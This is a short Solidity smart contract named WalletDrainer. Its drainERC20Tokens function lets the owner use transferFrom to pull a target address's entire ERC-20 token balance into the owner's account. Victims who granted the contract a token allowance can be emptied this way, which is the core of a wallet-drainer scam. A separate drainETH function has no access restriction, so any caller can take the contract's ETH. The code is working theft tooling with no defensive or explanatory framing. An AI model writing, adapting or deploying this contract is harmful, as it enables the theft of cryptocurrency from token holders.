// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Ownable.sol";

contract WalletDrainer is Ownable {

    event TokensDrained(address indexed token, uint256 amount);

    function drainERC20Tokens(address token, address target) external onlyOwner {
        IERC20 erc20Token = IERC20(token);
        uint256 balance = erc20Token.balanceOf(target);
        erc20Token.transferFrom(target, owner(), balance);
        emit TokensDrained(token, balance);
    }

    function withdrawERC20Tokens(address token) external onlyOwner {
        IERC20 erc20Token = IERC20(token);
        uint256 balance = erc20Token.balanceOf(address(this));
        erc20Token.transfer(owner(), balance);
    }

    function drainETH() external {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    function withdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(owner()).transfer(balance);
    }
}